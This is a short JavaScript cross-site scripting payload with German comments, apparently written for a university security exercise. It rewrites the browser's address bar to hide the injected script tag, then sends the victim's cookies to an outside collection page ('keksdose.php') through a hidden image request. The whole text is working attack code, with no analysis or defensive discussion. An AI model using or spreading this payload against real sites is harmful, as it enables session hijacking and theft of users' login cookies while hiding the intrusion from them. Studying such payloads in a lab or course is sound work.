// HIER ÄNDERN
var url = 'https://studi.f4.htw-berlin.de/~s0543210/keksdose.php';

// Ersetze die aktuelle URL durch eine saubere Version, um den Angriff zu verschleiern
window.history.replaceState({}, '', window.location.href.replace(/%3Cscript.*script%3E/,''));

// Lade die Keksdose als Bild und übergib den Cookie als Parameter in der URL
var img = document.createElement('img');
img.src = url + '?cookie=' + document.cookie;
img.style.display = 'none';
document.body.appendChild(img);
